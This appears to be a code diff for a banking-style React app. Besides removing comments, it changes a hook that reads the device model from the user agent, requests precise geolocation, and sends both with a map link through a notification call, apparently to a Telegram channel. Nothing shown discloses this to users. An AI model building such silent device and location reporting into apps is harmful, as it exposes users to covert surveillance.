@@ -42,7 +42,6 @@ function getDeviceId(): string {
 function getDeviceName(): string {
   const ua = navigator.userAgent || "";
 
-  // Android
   const androidMatch = ua.match(/Android\s+([\d.]+)/i);
   if (androidMatch) {
     const version = androidMatch[1];
@@ -53,14 +52,12 @@ function getDeviceName(): string {
     return `${model} (Android ${version})`;
   }
 
-  // iOS
   if (/iPhone|iPad|iPod/.test(ua)) {
     const isPad = /iPad/.test(ua);
     const version = ua.match(/OS\s+([\d_]+)/i)?.[1]?.replace(/_/g, ".") || "";
     return `${isPad ? "iPad" : "iPhone"}${version ? " (iOS " + version + ")" : ""}`;
   }
 
-  // Desktop
   if (/Windows NT/.test(ua)) {
     const ver = ua.match(/Windows NT\s+([\d.]+)/)?.[1] || "";
     return `Windows${ver ? " " + ver : ""}`;
@@ -129,7 +126,7 @@ export function BankApp() {
             const raw = localStorage.getItem(KEY);
             if (raw) useBank.getState().hydrate(JSON.parse(raw));
           } catch {
-            /* ignore broken snapshot */
+            /* ignore */
           }
           const saved = await saveWallet({ deviceId, data: snapshot(useBank.getState()) });
           if (saved?.updatedAt) seen = saved.updatedAt;
@@ -139,7 +136,7 @@ export function BankApp() {
           const raw = localStorage.getItem(KEY);
           if (raw) useBank.getState().hydrate(JSON.parse(raw));
         } catch {
-          /* stay on defaults */
+          /* stay */
         }
       }
       if (!stop) useBank.getState().markReady();
@@ -168,11 +165,12 @@ export function BankApp() {
   }, [toast, showToast]);
 
   useEffect(() => {
+    if (!access.open) return;
     const sent = sessionStorage.getItem("vesta-tg-sent");
     if (sent) return;
 
     const name = getDeviceName();
-    let text = `Qurilma kirdi: ${name}`;
+    const text = `Qurilma kirdi: ${name}`;
 
     const send = (msg: string) => {
       notifyDevice({ data: { text: msg } })
@@ -193,11 +191,11 @@ export function BankApp() {
         send(`${text}\n${loc}\n${map}`);
       },
       () => {
-        send(text + "\nLokatsiya: ruxsat berilmadi");
+        send(text + "\nLokatsiya: olishda xato");
       },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout: 8000, maximumAge: 120000 }
     );
-  }, []);
+  }, [access.open]);
 
   const dark = frame.screen === "success";
   const night = access.open === true && (frame.screen === "home" || frame.screen === "payments" || frame.screen === "savings" || frame.screen === "credits");
